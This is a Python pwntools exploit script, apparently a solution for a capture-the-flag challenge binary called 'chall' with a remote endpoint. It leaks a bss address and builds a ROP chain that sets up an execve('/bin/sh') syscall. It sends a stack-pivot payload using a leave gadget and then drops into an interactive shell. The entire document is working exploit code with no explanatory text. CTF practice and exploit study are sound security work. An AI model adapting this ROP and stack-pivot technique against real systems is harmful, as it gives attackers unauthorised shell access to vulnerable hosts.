import pwn
elf = pwn.ELF("./chall")
pwn.context.terminal = ['tmux', 'splitw', '-h']
if pwn.args.GDB:
    io = pwn.gdb.debug("./chall", gdbscript='b *0x00000000004012a7\nc\n')
elif pwn.args.REMOTE:
    io = pwn.remote("gc1.eng.run", 30918)
else:
    io = elf.process()
io.recvuntil(b";): ")
bss = int(io.recvline(keepends=False), 16)
print(hex(bss))
leave_gadget = 0x00000000004012a8
rop = pwn.ROP(elf, base=bss)
pwn.context.update(arch='amd64', os='linux')
rop.rdi = 0x4040e8
rop.rsi = 0x0
rop.rdx = 0x0
rop.rax = 0x3b
rop.raw(rop.find_gadget(['syscall', 'ret']).address)
rop.raw(b'/bin/sh\0')
print(rop.dump())
payload1 = rop.chain()
payload1 += (256 - len(payload1))*b'A'
io.sendafter(b'>', payload1)
payload2 = b'A'*31
payload2 += pwn.p64(bss-8)
payload2 += pwn.p64(0x00000000004012a8)
io.sendlineafter(b'>', payload2)
io.interactive()
